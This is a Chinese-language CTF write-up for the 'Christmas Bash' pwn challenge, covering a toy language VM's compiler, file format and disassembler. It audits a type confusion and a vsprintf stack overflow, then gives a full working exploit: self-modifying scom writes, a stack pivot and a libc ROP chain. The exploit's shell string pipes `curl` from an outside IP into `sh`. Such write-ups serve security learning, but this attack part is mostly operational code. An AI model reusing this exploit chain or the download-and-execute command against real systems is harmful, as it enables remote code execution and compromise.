# Christmas Bash

[toc]

题目源码：[slang -christmas](https://github.com/wlingze/Slang/tree/christmas)， 

>  建议先做完`[Christmas Song]`题目

## Slang-christmas设计思路 2

### opcode生成

`*.slang`的编译过程分前后端，

```c
// com/com.c
ast_t* front_process(char *slang_file){
    yyin = fopen(slang_file, "r");
    if (!yyin){
        printf("don't open file %s", slang_file);
        exit(EXIT_FAILURE);
    }
    yyout = fopen("/dev/null", "w");
    ast_t * m = NULL;
    yyparse(&m);
    fclose(yyin);
    fclose(yyout);
    return m;
}

void back_process(ast_t* m, char * scom_file){
    FILE * out = fopen(scom_file, "w");
    lambda_t *l = lambda_init();
    compile_stmts(m, l);
    save_scom(l, out);
    fclose(out);
}

void compile_file(char *slang_file, char *scom_file){   
    ast_t * module = front_process(slang_file);
    back_process(module, scom_file);
}
```

前端直接使用 `parser.y`和`scanner.l`生成对应的`ast_t`结构体，

后端从`ast_t`生成`lambda_t`， 对应结构：

```c
// include/lib/lambda.c
typedef struct lambda{
    vector_template(char, code);
    vector_template(int, number);
    vector_template(char *, string);
    vector_template(char *, word);
} lambda_t;
```

可以看到共分为代码code部分，变量名 word部分，和数据 number string部分，

其中生成对应代码时，这三者会使用索引的方式， 

```c
// lib/lambda.c
void emit_insn_load_word(pthis, ast_t *ast){
    insn(OP_LOAD_WORD);
    insn(lambda_set_word(this, ast->string_value));
}

void emit_insn_load_number(pthis, ast_t *ast){
    insn(OP_LOAD_NUMBER);
    insn(lambda_set_number(this, ast->int_value));
}

void emit_insn_load_string(pthis, ast_t *ast){
    insn(OP_LOAD_STRING);
    insn(lambda_set_string(this, ast->string_value));
}
```

在运行时，同样是采用索引获取对应的值， 

```c
// vm/vm_call.c
#define next l,r->rip++ 

#define get_code        lambda_get_code(next)
#define get_word        lambda_get_word(l, get_code)
#define get_number      lambda_get_number(l, get_code)
```

### scom文件结构

这个二进制文件的结构其实只是`lambda_t`直接转储出来而已， 可以在`file/scom.c: save_scom`函数和`load_scom`函数了解两者的转化。

### dis模块逻辑

dis运行的逻辑通过`line_t`来控制，所有的语句会记录地址和反汇编语句保存为`addr_t`结构，并记录在`line_t`结构中，同时跳转语句也会被记录，以便于在最后打印的时候将跳转语句分割开。

```c
// include/disasm/line.c
typedef struct addr{
    int addr;
    char * disasm;
} addr_t;

typedef struct line {
    int rip;
    int is_run;
    vector_template(addr_t*,  asm_code);
    vector_template(int, jmp_addr);
} line_t;
```

最后的打印通过`line_puts`打印所有反汇编语句。

```c
// disasm/line.c
void line_is_target(pthis, addr_t* item){
    int i=0, addr;
    vector_each(this->jmp_addr, i, addr){
        if(item->addr == addr)
            printf("\n");
    }
}

void line_puts(pthis){
    int i=0;
    addr_t *item;
    vector_each(this->asm_code, i, item){
        line_is_target(this, item);
        printf("%d\t%s\n", item->addr, item->disasm);
    }
}
```

为了实现这个操作，在线性反汇编运行时，所有的指令会转入`output`宏中，

```c
// disasm/disasm.c
void disasm_store(arg){
    output(r->rip-2, "pop\t%s", get_word);
}

void disasm_load_number(arg){
    output(r->rip-2, "push\t%d", get_number);
}

void disasm_load_string(arg){
    output(r->rip-2, "push\t\"%s\"", get_string);
}

void disasm_load_word(arg){
    output(r->rip-2, "push\t%s", get_word);
}

#define is_func(func_name) \
    !strcmp(func, (func_name))
void disasm_call(arg){
    char *func = get_word;
    output(r->rip-2, "call\t%s", func);
}
#undef is_func
```

这个宏其实是封装了 `line_fmt`函数，

```c
// include/disasm/disasm.h
#define output(addr, fmt, ...) \
    line_fmt(r, addr, fmt, ##__VA_ARGS__)
```

而这个函数用于生成对应反汇编语句和记录地址，

```c
// disasm/line.c
#define pthis line_t *this
void line_code(pthis, int addr, char * disasm_code){
    addr_t *a = malloc(sizeof(addr_t));
    a->addr = addr;
    a->disasm = strdup(disasm_code);
    vector_push_back(&(this->asm_code), a);
}

void line_fmt(pthis,int addr, char *fmt, ...){
    va_list ap;
    char buffer[0x80];
    
    va_start(ap, fmt);
    vsprintf(buffer, fmt, ap);
    va_end(ap);
    line_code(this, addr, buffer);
}
#undef pthis
```



## 漏洞审计

继续看slang-christmas， 



### 类型混淆

对于运行时的变量使用gift结构保存。

```c
// include/lib/gift.h
typedef struct gift {
    char *name;
    u_int64_t item;
} gift_t;

gift_t * gift_init(char *name, u_int64_t item);

// lib/gift.c
gift_t * gift_init(char *name, u_int64_t item){
    gift_t *this = malloc(sizeof(gift_t));
    this->name = name;
    this->item = item;
}
```

其中的item可以表示指针或者数值，且不作区分，这个位置就存在一个类型混淆，

```c
// vm/vm_call.c
void vm_opcode_store(runtime_t *r, lambda_t *l){
    u_int64_t item =  pop;
    char * name = get_word;
    gift_t *gift = get_gift(name);
    if (!gift){
        gift = gift_init(name, item);
        runtime_set_gift(r, gift);
    } else {
        gift->item = item;
    }
}
```

并且这个指针来自于字符串，那么这个指针指向堆内存，于是我们可以在堆内存中任意偏移。

### 栈溢出

在`line_fmt`函数中， `vsprintf`位置存在栈溢出。

> 应该用`vsnprintf`

```c
void line_fmt(pthis,int addr, char *fmt, ...){
    va_list ap;
    char buffer[0x80];
    
    va_start(ap, fmt);
    vsprintf(buffer, fmt, ap);
    va_end(ap);
    line_code(this, addr, buffer);
}
```

当传递`%s`的fmt时会触发栈溢出，

以下几个都可以，但是`load_string`会有`"`，不好利用，其他三个均可选择。

```c
void disasm_store(arg){
    output(r->rip-2, "pop\t%s", get_word);
}

void disasm_load_string(arg){
    output(r->rip-2, "push\t\"%s\"", get_string);
}

void disasm_load_word(arg){
    output(r->rip-2, "push\t%s", get_word);
}

#define is_func(func_name) \
    !strcmp(func, (func_name))
void disasm_call(arg){
    char *func = get_word;
    output(r->rip-2, "call\t%s", func);
}
#undef is_func
```

但是通过`%s`构造的栈溢出不能输入00， 只能考虑直接跳向某个地址或栈迁移的手法，

### sleep

在bash题目的`vm_call_lambda`函数中，在内存中存在一个 sleep函数指针。

![image.png](https://s2.loli.net/2022/01/03/sFYC9Bj2TXESgxD.png)

## 题目环境

题目环境设置在server.py文件中 

通过网络请求获取到文件，这里我本地跑了个`php -S 0.0.0.0:8080`,  同时会给一个远程文件的目录，

然后首先运行 `-r`， 然后 `-r -d`， 

```python
def get_user_input(filename):
    socket_print("emmm let me see, first put this thing in a safe place, I test it: {}".format(filename))
    socket_print("please input your flag url: ")
    url = input()
    urllib.request.urlretrieve(url,filename)
    socket_print("Okay, now I've got the file")


def run_challenge(filename):
    socket_print("Don't think I don't know what you're up to.")
    socket_print("You must be a little hack who just learned the Christmas song!")
    socket_print("Come let me test what you gave me!")
    result = subprocess.check_output("/home/ctf/Christmas_Bash -r {} < /dev/null".format(filename), shell=True)
    if (result.decode() == "hello"):
        socket_print("wow, that looks a bit unusual, I'll try to decompile it and see.")
        os.system("/home/ctf/Christmas_Bash -r {} -d {} < /dev/null".format(filename, filename))
    else:
        socket_print("Hahahahahahahahahahahahaha, indeed, you should also continue to learn Christmas songs!")
    clean(filename);
```



## 利用

我的思路其实是利用那个栈溢出的位置。

利用思路分为几段，最主要的是通过open write修改scom文件本身，

### 栈溢出利用

这里选择了pop， 简单编写了一个slang文件：

```
// overflow.slang
gift aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb is 1;
```

编译出来的到`overflow.scom`,  修改对应`a`的个数，调试确定溢出的长度。

栈溢出 栈迁移的打法: `'a' * 0x14c + fake_stack`, 

### scom文件自修改

#### 栈迁移地址

那么栈迁移的fake_stack地址从哪里来呢，程序内的输入其实不太好包含带有00的地址，于是我想到了这个位置, 

载入scom文件时，对于字符串处理，直接按照长度读取出来，

```c
// file/scom.c : load_scom
	for(i=0; i<string_count; i++){
        scom(&(len), 4);
        item = malloc(len);
        scom(item, len);
        item[len] = 0;
        vector_push_back(&(lambda->string), item);
    }
```

于是我有个这样的思路， 

在第二次`-r -d`的运行时，`-r`的一次运行进行自我修改，将opcode修改为栈溢出的那个dome的样子，然后开始写入填充的'a', 最后配合`gift`的类型混淆可以偏移指针指向我们设置好的rop位置，

大概的slang逻辑如下，编译出来以后修改headerb为前面编译出来的`overflow.scom`的文件头和opcode，

```
gift headerb is "2222222222222222222222222222222222222222";
# headerb -> push 1; pop $name(overflow)#
gift pad is "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
# 'a' * 0x80 #
gift rop is "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
# rop 'b' * 0x100#

# set overflow to rop#
reindeer Dancer delivering gift fileb oflag mode brings back gift fdb;
#fdb = open(filename, oflag, mode)#
gift size is 36;
reindeer Rudolph delivering gift fdb headerb size;
#write(fdb, headerb, size)#

gift size is 128;
reindeer Rudolph delivering gift fdb pad size;
reindeer Rudolph delivering gift fdb pad size;
gift size is 64;
reindeer Rudolph delivering gift fdb pad size;
gift size is 12;
reindeer Rudolph delivering gift fdb pad size;
# write(fdb, pad, 0x14c)#

gift size is 8;
gift ptr is ptr - 56;
# ptr = &rop#
reindeer Rudolph delivering gift fdb ptr size;
# write(fdb, ptr, 8)#
```

这样运行一次以后，scom文件就变为了刚刚的`overflow.scom`文件，

#### 两次运行不一致

这样我们还剩下一个问题，我们现在利用在`-r -d`位置，但是前面还有一次`-r`的运行，

因此要让两次`-r`运行不一致，这里同样适用了自修改的技巧，

首先在文件最开头设置变量`check = 1; a=2`, 于是我们的到`push 0; pop check; push 1; pop a`, 其实这个pop后跟的是对应`lambda->number`中的索引值，

于是还是自修改，我们只需要修改前面的`magic`和opcode第二位即可，

![image.png](https://s2.loli.net/2022/01/04/binYVB4GvcRsPLI.png)

这样修改为`push 1; pop check;`于是变成了check=2, 配合一个want构造的if结构即可。

```
gift check is 1;
gift a is 2;

this family wants gift check
    if the gift equal to 1:
        reindeer Dancer delivering gift filea oflag mode brings back gift fda;
        #fda = open(filea, oflag, mode)#
        gift size is 16;
        reindeer Rudolph delivering gift fda headera size;
        # write(fda, headera, size)#
        
        reindeer Rudolph delivering gift stdout aaa size;
    if the gift equal to 2:
        reindeer Rudolph delivering gift stdout bbb size;
ok, they should already have a gift;
```

![image.png](https://s2.loli.net/2022/01/04/zCPGpy7EUcYIdO8.png)

### rop链

最后的rop构造其实我还是用的类型混淆的指针偏移，然后从sleep中得到了libc_base， system， ret地址，然后都保存为一个gift变量，然后通过指针移动配合`memcpy`函数，全写到堆块中，

```
        # set rop#
        # remote #
        gift libc is sleep  - 972880;
        gift system is libc + 346848;
        gift poprdi is libc + 190149;
        gift ret is libc + 190150;

        gift ptr is ptr + 3072; # pop rdi#
        gift rop is rop + 8;
        reindeer Vixen delivering gift rop ptr size;
        gift rop is rop + 8;
        gift ptr is ptr - 1120; # shell#
        reindeer Vixen delivering gift rop ptr size;
        gift rop is rop + 8;
        gift ptr is ptr + 1152; # ret #
        reindeer Vixen delivering gift rop ptr size;
        gift rop is rop + 8;
        gift ptr is ptr - 64; # system #
        reindeer Vixen delivering gift rop ptr size;
```

## exp

* exp.slang

exp的逻辑如下，编译出来exp.scom，对一些没法直接写入的位置进行修改。

headera修改为自己的文件前16位并修改`pop 0`为`pop 1`，

headerb修改为overflow.scom的前36位，

shell记得最后写00截断，

Filea fileb 储存是同一个字符串，每次连接远程要修改文件名。

对应的exp.scom文件也在github。

```
gift check is 1;
gift a is 2;

gift headera is "111111111111111111111111";
# opcode -> check = 2#
gift headerb is "2222222222222222222222222222222222222222";
# headerb -> push 1; pop $name(overflow)#
gift pad is "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
# 'a' * 0x80 #
gift rop is "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
# rop 'b' * 0x100#
#gift shell is "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";#
gift shell is "bash -c 'curl 1.14.92.160|sh'#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

gift stdout is 1;
gift filea is "/tmp/aaaa.scom#aaaaaaaaaaaaaaa";
gift fileb is "/tmp/aaaa.scom#aaaaaaaaaaaaaaa";
gift hello is "hello";
gift hellolen is 5;
gift oflag is 65;
gift none is 0;
gift mode is 432;
gift fda is 0;
gift fdb is 0;
gift fdb is [a];

gift ptr is "123456";


# ptr to leave#
this family wants gift check
    if the gift equal to 1:
        reindeer Dancer delivering gift filea oflag mode brings back gift fda;
        reindeer Rudolph delivering gift stdout hello hellolen;
        gift size is 16;
        reindeer Rudolph delivering gift fda headera size;

    if the gift equal to 2:
        # set overflow to rop#
        reindeer Dancer delivering gift fileb oflag mode brings back gift fdb;
        gift size is 36;
        reindeer Rudolph delivering gift fdb headerb size;
        gift size is 128;
        reindeer Rudolph delivering gift fdb pad size;
        reindeer Rudolph delivering gift fdb pad size;
        gift size is 64;
        reindeer Rudolph delivering gift fdb pad size;
        gift size is 12;
        reindeer Rudolph delivering gift fdb pad size;
        gift size is 8;
        gift ptr is ptr - 56;
        reindeer Rudolph delivering gift fdb ptr size;
        # set rop#
        # remote #
        gift libc is sleep  - 972880;
        gift system is libc + 346848;
        gift poprdi is libc + 190149;
        gift ret is libc + 190150;
        # local #
        # gift libc is  sleep - 941888; #
        # gift system is libc + 349200; #
        # gift poprdi is libc + 158578; #
        # gift ret is libc + 158579; #
        gift ptr is ptr + 3072; 
        gift rop is rop + 8;
        reindeer Vixen delivering gift rop ptr size;
        gift rop is rop + 8;
        gift ptr is ptr - 1120; # shell#
        reindeer Vixen delivering gift rop ptr size;
        gift rop is rop + 8;
        gift ptr is ptr + 1152; # ret #
        reindeer Vixen delivering gift rop ptr size;
        gift rop is rop + 8;
        gift ptr is ptr - 64; # system #
        reindeer Vixen delivering gift rop ptr size;
ok, they should already have a gift;
```

